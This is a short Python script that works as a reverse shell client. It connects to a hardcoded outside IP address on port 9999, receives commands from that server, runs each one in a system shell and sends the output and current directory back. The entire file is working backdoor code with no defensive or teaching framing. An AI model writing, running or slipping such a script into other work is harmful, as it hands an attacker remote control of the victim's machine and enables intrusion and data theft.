""" FUNCTIONS """
# try and connect to our server
# wait for the instructions
# receive the instruction and run them
# take the result and send them back to the server

import socket, os, subprocess
from sys import stdout

s = socket.socket()
host, port = "167.71.225.124", 9999 # server ip address or private IP addresses of computer

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data and data[:2].decode('utf-8') in ['cd']:
        os.chdir(data[3:].decode('utf-8'))

    if data:
        cmd = subprocess.Popen(
            data.decode('utf-8'), shell =True, stdout = subprocess.PIPE,
            stdin = subprocess.PIPE, stderr = subprocess.PIPE
            )
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_string = str(output_byte, 'utf-8')
        pwd = os.getcwd() + '>'
        s.send(str.encode(output_string + pwd))

        print(output_string)


        